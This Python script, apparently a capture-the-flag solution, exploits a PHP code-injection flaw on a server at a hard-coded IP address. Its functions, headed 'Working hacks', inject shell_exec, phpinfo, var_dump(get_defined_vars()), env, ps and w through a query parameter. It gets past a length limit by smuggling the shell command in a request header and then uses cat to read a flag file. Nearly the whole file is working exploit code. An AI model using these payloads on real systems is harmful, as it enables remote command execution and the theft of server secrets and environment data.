import requests

# Working hacks

## PWD
def GetPwd():
    injectedCommand = "getcwd()"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Run Ls
def GetLsOnServer():
    baseUrl = "http://192.46.227.32//?roll="
    injectedCommand = "shell_exec(ls)"
    endingStuff = ".getcwd"

    fullRequest = baseUrl + injectedCommand + endingStuff
    response = requests.get(fullRequest)

    lsResults = "response.text"
    return lsResults

## Run PS
def PsOnServer():
    injectThisBash = "ps"
    injectedCommand = InjectBash(injectThisBash)

    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Show Logged in users
def ShowLoggedInUsers():
    injectThisBash = "w"
    injectedCommand = InjectBash(injectThisBash)

    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Get defined functions key
def GetDefinedFunctionsKey():
    injectedCommand = "key(get_defined_functions())"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Get Defined Functions
def GetDefinedFunctions():
    injectedCommand = "var_dump(get_defined_functions())"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Get Current User
def GetCurentUser():
    injectedCommand = "get_current_user()"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText


## Get Defined vars
def GetDefinedVars():
    injectedCommand = "var_dump(get_defined_vars())"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText


## Get EnvironmentVars
def GetBashEnvironmentVars():
    injectThisBash = "env"
    injectedCommand = InjectBash(injectThisBash)

    responseText = TryInjectedPayload(injectedCommand)
    return responseText


## Get PHP Info
def GetPHPInfo():
    injectedCommand = "phpinfo()"
    responseText = TryInjectedPayload(injectedCommand)
    return responseText

## Get the key name of the first header sent... host in this case.
def GetHeaderKeyName():
    injectedCommand = "key(getallheaders())"
    injectedHeaders = "Hello There friend!"
    responseText = TryInjectedPayloadWithHeaders(injectedCommand, injectedHeaders)
    return responseText




# Helper funcs
def InjectedStuffIsTooLong(stringToCheck):
    if (len(stringToCheck) > 50):
        return True
    else:
        return False

def TryInjectedPayload(injectedPayload):
    baseUrl = "http://192.46.227.32//?roll="
    endingStuff = ".getcwd"
    fullRequest = baseUrl + injectedPayload + endingStuff
    if(InjectedStuffIsTooLong(injectedPayload + endingStuff) == False):
        response = requests.get(fullRequest)
        print("Stats: ", response.status_code)
        return response.text
    else:
        return "Injected payload too long."



def TryInjectedPayloadWithHeaders(injectedPayload, injectedHeaders):
    baseUrl = "http://192.46.227.32//?roll="
    endingStuff = ".getcwd"
    fullRequest = baseUrl + injectedPayload + endingStuff

    headers = {'stuff': injectedHeaders}

    if(InjectedStuffIsTooLong(injectedPayload + endingStuff) == False):
        response = requests.get(fullRequest, headers=headers)
        print("Stats: ", response.status_code)
        return response.text
    else:
        return "Injected payload too long."


def InjectBash(bashToInject):
    fullString = "shell_exec(" + bashToInject + ")"
    return fullString

## MAIN.

#injectThisBash = "set"
#injectedCommand = InjectBash(injectThisBash)
injectedCommand = "shell_exec(end(getallheaders()))"
injectedHeaders = "cat fl4g_here_but_can_you_get_it_hohoho.php"
responseText = TryInjectedPayloadWithHeaders(injectedCommand, injectedHeaders)
print(responseText)


